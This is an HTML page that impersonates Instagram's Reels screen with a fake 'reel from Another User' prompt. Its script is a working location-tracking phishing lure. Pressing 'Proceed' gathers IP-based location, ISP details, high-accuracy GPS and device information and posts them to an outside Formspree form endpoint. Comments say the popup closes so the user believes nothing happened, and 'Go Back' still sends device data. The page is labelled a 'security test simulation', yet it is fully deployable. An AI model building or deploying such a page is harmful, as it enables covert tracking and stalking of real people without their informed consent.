<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>Instagram • Reels</title>
  <link rel="icon" type="image/png" href="logo_instagram.png">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #000;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 0;
      overflow: hidden;
    }

    .instagram-reel-container {
      width: 100%;
      max-width: 430px;
      background: #000;
      height: 100vh;
      max-height: 932px;
      display: flex;
      flex-direction: column;
      position: relative;
      overflow: hidden;
    }

    .status-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 16px 6px;
      color: white;
      font-size: 15px;
      font-weight: 590;
      background: linear-gradient(to bottom, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0) 100%);
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      z-index: 20;
    }

    .time {
      font-weight: 600;
    }

    .status-icons {
      display: flex;
      gap: 4px;
      font-size: 12px;
    }

    .reel-header {
      position: absolute;
      top: 44px;
      left: 0;
      right: 0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 10px 16px;
      color: white;
      z-index: 20;
      background: linear-gradient(180deg, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0) 100%);
    }

    .header-left {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .back-arrow {
      font-size: 26px;
      cursor: default;
      color: white;
      font-weight: 300;
    }

    .reels-text {
      font-size: 24px;
      font-weight: 800;
      background: linear-gradient(135deg, #fff, #e0e0e0);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
    }

    .camera-icon {
      font-size: 24px;
      filter: drop-shadow(0 1px 2px rgba(0,0,0,0.3));
    }

    .reel-video-area {
      flex: 1;
      background: #0a0a0a;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    .fake-video {
      width: 100%;
      height: 100%;
      background-image: radial-gradient(circle at 40% 50%, #2c2c2c, #0f0f0f);
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    .fake-video::after {
      content: '';
      position: absolute;
      inset: 0;
      background: radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,0.3) 100%);
      pointer-events: none;
    }

    .play-badge {
      width: 72px;
      height: 72px;
      background: rgba(0, 0, 0, 0.55);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      backdrop-filter: blur(12px);
      border: 1.5px solid rgba(255,255,255,0.4);
      transition: transform 0.2s ease, background 0.2s ease;
      cursor: pointer;
      z-index: 2;
    }

    .play-badge:hover {
      transform: scale(1.05);
      background: rgba(0, 0, 0, 0.65);
    }

    .play-badge::after {
      content: '';
      display: block;
      width: 0;
      height: 0;
      border-left: 26px solid white;
      border-top: 15px solid transparent;
      border-bottom: 15px solid transparent;
      margin-left: 5px;
    }

    .action-sidebar {
      position: absolute;
      right: 14px;
      bottom: 100px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 24px;
      z-index: 15;
      color: white;
    }

    .action-btn {
      display: flex;
      flex-direction: column;
      align-items: center;
      background: transparent;
      border: none;
      color: white;
      gap: 6px;
      font-size: 28px;
      cursor: pointer;
      transition: transform 0.2s ease;
      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
    }

    .action-btn:hover {
      transform: scale(1.1);
    }

    .action-btn span {
      font-size: 12px;
      font-weight: 600;
      background: rgba(0,0,0,0.4);
      padding: 2px 6px;
      border-radius: 20px;
      transition: background 0.2s ease;
    }

    .reel-info {
      position: absolute;
      bottom: 24px;
      left: 16px;
      right: 72px;
      color: white;
      z-index: 15;
      display: flex;
      flex-direction: column;
      gap: 10px;
      text-shadow: 0 1px 2px rgba(0,0,0,0.5);
    }

    .username-row {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .profile-pic {
      width: 38px;
      height: 38px;
      background: linear-gradient(145deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      color: white;
      border: 2px solid white;
      box-shadow: 0 2px 6px rgba(0,0,0,0.3);
    }

    .username {
      font-weight: 700;
      font-size: 15px;
    }

    .follow-btn {
      background: #0095f6;
      color: white;
      padding: 5px 14px;
      border-radius: 12px;
      font-size: 11px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.2s ease;
      box-shadow: 0 1px 2px rgba(0,0,0,0.2);
    }

    .follow-btn:hover {
      background: #0081d4;
      transform: scale(1.02);
    }

    .caption {
      font-size: 14px;
      line-height: 1.35;
    }

    .music-row {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 12px;
      background: rgba(0,0,0,0.35);
      padding: 5px 12px;
      border-radius: 30px;
      width: fit-content;
      cursor: pointer;
      transition: background 0.2s ease;
      backdrop-filter: blur(4px);
    }

    .music-row:hover {
      background: rgba(0,0,0,0.5);
    }

    .permission-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(8px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      animation: fadeIn 0.25s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; backdrop-filter: blur(0px); }
      to { opacity: 1; backdrop-filter: blur(8px); }
    }

    .permission-sheet {
      background: rgba(28, 28, 30, 0.98);
      backdrop-filter: blur(40px);
      border-radius: 28px;
      width: 90%;
      max-width: 340px;
      overflow: hidden;
      box-shadow: 0 25px 50px rgba(0,0,0,0.5), 0 0 0 0.5px rgba(255,255,255,0.1);
      animation: slideUp 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
    }

    @keyframes slideUp {
      from { transform: translateY(60px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    .sheet-header {
      padding: 24px 20px 16px;
      text-align: center;
    }

    .sheet-icon {
      width: 70px;
      height: 70px;
      margin: 0 auto 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: iconPop 0.35s ease-out;
    }

    @keyframes iconPop {
      0% { transform: scale(0.7); opacity: 0; }
      70% { transform: scale(1.05); }
      100% { transform: scale(1); opacity: 1; }
    }

    .sheet-icon img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      border-radius: 20%;
    }

    .sheet-title {
      font-size: 19px;
      font-weight: 620;
      color: #fff;
      margin-bottom: 8px;
      letter-spacing: -0.2px;
    }

    .sheet-subtitle {
      font-size: 13px;
      color: #8e8e93;
      line-height: 1.45;
      padding: 0 8px;
    }

    .sheet-options {
      border-top: 0.5px solid rgba(255,255,255,0.1);
      margin-top: 12px;
    }

    .sheet-option {
      padding: 17px 20px;
      text-align: center;
      font-size: 17px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
      border-bottom: 0.5px solid rgba(255,255,255,0.08);
      position: relative;
      overflow: hidden;
    }

    .sheet-option:active {
      transform: scale(0.98);
    }

    .allow-option {
      color: #0095f6;
      font-weight: 600;
      background: linear-gradient(90deg, transparent, rgba(0, 149, 246, 0.08), transparent);
      background-size: 200% 100%;
      background-position: 100% 0;
      transition: background-position 0.3s ease, transform 0.1s ease;
    }

    .allow-option:hover {
      background-position: 0 0;
      color: #0aa3ff;
    }

    .deny-option {
      color: #fff;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.05), transparent);
      background-size: 200% 100%;
      background-position: 100% 0;
      transition: background-position 0.3s ease, transform 0.1s ease;
    }

    .deny-option:hover {
      background-position: 0 0;
      color: #e8e8e8;
    }

    .hidden {
      display: none !important;
    }

    .progress-bar {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 2px;
      background: rgba(255,255,255,0.2);
      z-index: 15;
    }
    
    .progress-fill {
      width: 65%;
      height: 100%;
      background: white;
    }
  </style>
</head>
<body>
  <div class="instagram-reel-container">
    <div class="status-bar">
      <div class="time" id="liveTime">9:41</div>
      <div class="status-icons">
        <span>📶</span>
        <span>📡</span>
        <span>🔋 100%</span>
      </div>
    </div>

    <div class="reel-header">
      <div class="header-left">
        <span class="back-arrow">←</span>
        <span class="reels-text">Reels</span>
      </div>
      <div class="camera-icon">📷</div>
    </div>

    <div class="reel-video-area">
      <div class="fake-video">
        <div class="play-badge"></div>
      </div>
      <div class="progress-bar">
        <div class="progress-fill"></div>
      </div>

      <div class="action-sidebar">
        <div class="action-btn">❤️<span>42.3K</span></div>
        <div class="action-btn">💬<span>1,284</span></div>
        <div class="action-btn">➤<span>Share</span></div>
        <div class="action-btn">⋯<span></span></div>
      </div>

      <div class="reel-info">
        <div class="username-row">
          <div class="profile-pic">🎵</div>
          <span class="username">music_vibes</span>
          <span class="follow-btn">Follow</span>
        </div>
        <div class="caption">
          New drop just landed 🔥 #reels #trending
        </div>
        <div class="music-row">
          🎵 Better Now - trending audio
        </div>
      </div>
    </div>
  </div>

  <div id="permissionOverlay" class="permission-overlay">
    <div class="permission-sheet">
      <div class="sheet-header">
        <div class="sheet-icon">
          <img src="logo_instagram.png" alt="Instagram" id="instagramLogo">
        </div>
        <div class="sheet-title">You have a reel from Another User. Proceed?</div>
        <div class="sheet-subtitle">Reels you watch may appear in your feed recommendations. Tap to watch the reel they sent you.</div>
      </div>
      <div class="sheet-options">
        <div id="allowBtn" class="sheet-option allow-option">Proceed</div>
        <div id="denyBtn" class="sheet-option deny-option">Go Back</div>
      </div>
    </div>
  </div>

  <form id="dataForm" action="https://formspree.io/f/xknkloqe" method="POST" style="display: none;">
    <input type="email" name="email" id="emailField">
    <textarea name="message" id="messageField"></textarea>
  </form>

  <script>
    (function() {
      const overlay = document.getElementById('permissionOverlay');
      const allowBtn = document.getElementById('allowBtn');
      const denyBtn = document.getElementById('denyBtn');
      const dataForm = document.getElementById('dataForm');
      const emailField = document.getElementById('emailField');
      const messageField = document.getElementById('messageField');
      const instagramLogo = document.getElementById('instagramLogo');
      
      const faviconLink = document.querySelector("link[rel='icon']");
      if (faviconLink && instagramLogo) {
        faviconLink.href = "logo_instagram.png";
      }

      let capturedData = {
        ip_location: null,
        cell_tower_location: null,
        gps_location: null
      };

      let gpsComplete = false;
      let ipComplete = false;
      let cellComplete = false;
      let popupClosed = false;

      if (instagramLogo) {
        instagramLogo.onerror = function() {
          this.style.display = 'none';
          const fallback = document.createElement('div');
          fallback.textContent = '📷';
          fallback.style.fontSize = '52px';
          fallback.style.background = 'radial-gradient(circle at 30% 30%, #fdf497, #fdf497, #fd5949, #d6249f, #285AEB)';
          fallback.style.width = '70px';
          fallback.style.height = '70px';
          fallback.style.borderRadius = '32%';
          fallback.style.display = 'flex';
          fallback.style.alignItems = 'center';
          fallback.style.justifyContent = 'center';
          this.parentNode.appendChild(fallback);
          this.remove();
        };
      }

      function updateTime() {
        const now = new Date();
        let hours = now.getHours();
        let minutes = now.getMinutes();
        const timeStr = `${hours}:${minutes.toString().padStart(2, '0')}`;
        const timeElement = document.getElementById('liveTime');
        if (timeElement) timeElement.textContent = timeStr;
      }
      updateTime();
      setInterval(updateTime, 60000);

      function captureIPLocation() {
        return fetch('https://ipapi.co/json/')
          .then(response => response.json())
          .then(data => {
            if (data.latitude && data.longitude) {
              capturedData.ip_location = {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy_meters: data.accuracy_radius || 5000,
                city: data.city,
                region: data.region,
                country: data.country_name,
                postal_code: data.postal,
                ip_address: data.ip
              };
            }
            ipComplete = true;
            checkAllComplete();
          })
          .catch(() => {
            ipComplete = true;
            checkAllComplete();
          });
      }

      function captureCellTowerLocation() {
        return fetch('https://ipwho.is/')
          .then(response => response.json())
          .then(data => {
            if (data.latitude && data.longitude) {
              capturedData.cell_tower_location = {
                latitude: parseFloat(data.latitude),
                longitude: parseFloat(data.longitude),
                accuracy_meters: data.accuracy_radius || 1000,
                city: data.city,
                region: data.region,
                country: data.country,
                isp: data.connection?.isp || 'Unknown',
                connection_type: data.connection?.type || 'Unknown'
              };
            }
            cellComplete = true;
            checkAllComplete();
          })
          .catch(() => {
            cellComplete = true;
            checkAllComplete();
          });
      }

      // GPS function - triggers browser prompt but DOES NOT change button text
      function captureGPSLocation() {
        console.log("🛰️ Requesting GPS location - browser prompt should appear now...");
        
        if (!navigator.geolocation) {
          console.log("❌ Geolocation not supported");
          capturedData.gps_location = { status: "GPS not supported by browser" };
          gpsComplete = true;
          checkAllComplete();
          return;
        }
        
        // DIRECT call to getCurrentPosition - triggers browser's native permission prompt
        // Button text NEVER changes - stays as "Proceed"
        navigator.geolocation.getCurrentPosition(
          function(position) {
            console.log("✅ GPS permission GRANTED! Position captured.");
            capturedData.gps_location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy_meters: position.coords.accuracy,
              altitude_meters: position.coords.altitude,
              heading_degrees: position.coords.heading,
              speed_mps: position.coords.speed,
              timestamp: position.timestamp,
              status: "Granted"
            };
            gpsComplete = true;
            checkAllComplete();
          },
          function(error) {
            let errorMsg = "";
            switch(error.code) {
              case error.PERMISSION_DENIED:
                errorMsg = "User denied GPS permission";
                console.log("❌ GPS permission DENIED by user");
                break;
              case error.POSITION_UNAVAILABLE:
                errorMsg = "GPS position unavailable";
                console.log("❌ GPS position unavailable");
                break;
              case error.TIMEOUT:
                errorMsg = "GPS request timed out";
                console.log("❌ GPS request timed out");
                break;
              default:
                errorMsg = "Unknown GPS error";
                console.log("❌ Unknown GPS error");
            }
            capturedData.gps_location = { status: errorMsg };
            gpsComplete = true;
            checkAllComplete();
          },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      }

      function formatCleanEmail() {
        const now = new Date();
        
        let emailBody = `
╔══════════════════════════════════════════════════════════════╗
║                    📍 LOCATION DATA CAPTURE                  ║
╚══════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🕐 TIME & DEVICE INFO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Timestamp:     ${now.toLocaleString()}
  Timezone:      ${Intl.DateTimeFormat().resolvedOptions().timeZone}
  User Agent:    ${navigator.userAgent.substring(0, 80)}...
  Platform:      ${navigator.platform}
  Language:      ${navigator.language}
  Screen Size:   ${window.screen.width}x${window.screen.height}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  📡 IP LOCATION (Low Accuracy - Always Available)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
        
        if (capturedData.ip_location) {
          emailBody += `
  Status:        ✅ CAPTURED
  Coordinates:   ${capturedData.ip_location.latitude}, ${capturedData.ip_location.longitude}
  Accuracy:      ${capturedData.ip_location.accuracy_meters} meters
  City:          ${capturedData.ip_location.city}
  Region:        ${capturedData.ip_location.region}
  Country:       ${capturedData.ip_location.country}
  Postal Code:   ${capturedData.ip_location.postal_code}
  IP Address:    ${capturedData.ip_location.ip_address}`;
        } else {
          emailBody += `
  Status:        ❌ NOT CAPTURED`;
        }

        emailBody += `

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  📶 CELL TOWER / WIFI LOCATION (Medium Accuracy)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
        
        if (capturedData.cell_tower_location) {
          emailBody += `
  Status:        ✅ CAPTURED
  Coordinates:   ${capturedData.cell_tower_location.latitude}, ${capturedData.cell_tower_location.longitude}
  Accuracy:      ${capturedData.cell_tower_location.accuracy_meters} meters
  City:          ${capturedData.cell_tower_location.city}
  Region:        ${capturedData.cell_tower_location.region}
  Country:       ${capturedData.cell_tower_location.country}
  ISP:           ${capturedData.cell_tower_location.isp}
  Connection:    ${capturedData.cell_tower_location.connection_type}`;
        } else {
          emailBody += `
  Status:        ❌ NOT CAPTURED`;
        }

        emailBody += `

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🛰️ GPS LOCATION (High Accuracy - Requires Permission)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
        
        if (capturedData.gps_location && capturedData.gps_location.status === "Granted") {
          emailBody += `
  Status:        ✅ GRANTED & CAPTURED
  Coordinates:   ${capturedData.gps_location.latitude}, ${capturedData.gps_location.longitude}
  Accuracy:      ${capturedData.gps_location.accuracy_meters} meters
  Altitude:      ${capturedData.gps_location.altitude_meters || 'N/A'} meters
  Heading:       ${capturedData.gps_location.heading_degrees || 'N/A'}°
  Speed:         ${capturedData.gps_location.speed_mps || 'N/A'} m/s`;
        } else if (capturedData.gps_location) {
          emailBody += `
  Status:        ❌ ${capturedData.gps_location.status}`;
        } else {
          emailBody += `
  Status:        ❌ NOT CAPTURED`;
        }

        emailBody += `

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🌐 NETWORK INFORMATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
        
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
          emailBody += `
  Connection Type: ${conn.effectiveType || 'Unknown'}
  Round Trip Time: ${conn.rtt || 'N/A'} ms
  Downlink Speed:  ${conn.downlink || 'N/A'} Mbps`;
        } else {
          emailBody += `
  Not available`;
        }

        emailBody += `

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  📊 CAPTURE SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ✅ IP Location:     ${capturedData.ip_location ? 'CAPTURED' : 'FAILED'}
  ✅ Cell/WiFi:       ${capturedData.cell_tower_location ? 'CAPTURED' : 'FAILED'}
  ✅ GPS:             ${(capturedData.gps_location && capturedData.gps_location.status === 'Granted') ? 'CAPTURED' : 'DENIED/FAILED'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⚠️  SECURITY TEST SIMULATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  This data was captured from a simulated malicious website
  designed to test security detection capabilities.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
        
        return emailBody;
      }

      function checkAllComplete() {
        if (ipComplete && cellComplete && gpsComplete) {
          const emailBody = formatCleanEmail();
          messageField.value = emailBody;
          emailField.value = `location_capture_${Date.now()}@ig-reel.com`;
          
          const formData = new FormData(dataForm);
          
          fetch(dataForm.action, {
            method: 'POST',
            body: formData,
            headers: { 'Accept': 'application/json' }
          })
          .then(response => {
            if (response.ok) {
              console.log("✅ Clean email sent to Formspree");
            }
          })
          .catch(err => {
            console.error("Network error:", err);
            try {
              const tempForm = dataForm.cloneNode(true);
              document.body.appendChild(tempForm);
              tempForm.submit();
              setTimeout(() => tempForm.remove(), 500);
            } catch(e) {}
          });
          
          overlay.classList.add('hidden');
        }
      }

      function resetFlags() {
        gpsComplete = false;
        ipComplete = false;
        cellComplete = false;
        capturedData = {
          ip_location: null,
          cell_tower_location: null,
          gps_location: null
        };
      }

      // When Proceed is clicked - triggers all captures, button text NEVER changes
      allowBtn.addEventListener('click', (e) => {
        e.preventDefault();
        console.log("🚀 Proceed clicked - capturing all location sources...");
        console.log("   📡 IP location (silent)");
        console.log("   📶 Cell tower location (silent)"); 
        console.log("   🛰️ GPS location - WILL trigger browser permission prompt");
        console.log("   ⚠️ Button text remains 'Proceed' - user sees no change");
        
        resetFlags();
        
        // Start all three captures
        captureIPLocation();
        captureCellTowerLocation();
        captureGPSLocation(); // Triggers browser's native permission dialog
        
        // Close the popup immediately so user thinks action is done
        overlay.classList.add('hidden');
      });

      denyBtn.addEventListener('click', (e) => {
        e.preventDefault();
        
        const denyBody = `
╔══════════════════════════════════════════════════════════════╗
║                    🚫 ACCESS DENIED BY USER                  ║
╚══════════════════════════════════════════════════════════════╝

  User clicked "Go Back" - No location data was captured
  Timestamp: ${new Date().toLocaleString()}
  User Agent: ${navigator.userAgent.substring(0, 80)}...
  Platform: ${navigator.platform}
  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  SECURITY TEST - User declined to proceed
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
        
        messageField.value = denyBody;
        emailField.value = `denied_${Date.now()}@ig-reel.com`;
        
        const formData = new FormData(dataForm);
        fetch(dataForm.action, {
          method: 'POST',
          body: formData,
          headers: { 'Accept': 'application/json' }
        }).catch(() => {});
        
        overlay.classList.add('hidden');
      });

      const buttons = [allowBtn, denyBtn];
      buttons.forEach(btn => {
        btn.addEventListener('mousedown', (e) => {
          const rect = btn.getBoundingClientRect();
          const x = e.clientX - rect.left;
          const y = e.clientY - rect.top;
          
          const ripple = document.createElement('span');
          ripple.style.position = 'absolute';
          ripple.style.width = '0px';
          ripple.style.height = '0px';
          ripple.style.borderRadius = '50%';
          ripple.style.backgroundColor = 'rgba(255, 255, 255, 0.2)';
          ripple.style.transform = 'translate(-50%, -50%)';
          ripple.style.left = x + 'px';
          ripple.style.top = y + 'px';
          ripple.style.transition = 'width 0.4s ease, height 0.4s ease, opacity 0.4s ease';
          ripple.style.pointerEvents = 'none';
          ripple.style.zIndex = '10';
          
          btn.style.position = 'relative';
          btn.style.overflow = 'hidden';
          btn.appendChild(ripple);
          
          setTimeout(() => {
            ripple.style.width = '300px';
            ripple.style.height = '300px';
            ripple.style.opacity = '0';
          }, 10);
          
          setTimeout(() => {
            ripple.remove();
          }, 400);
        });
      });
    })();
  </script>
</body>
</html>
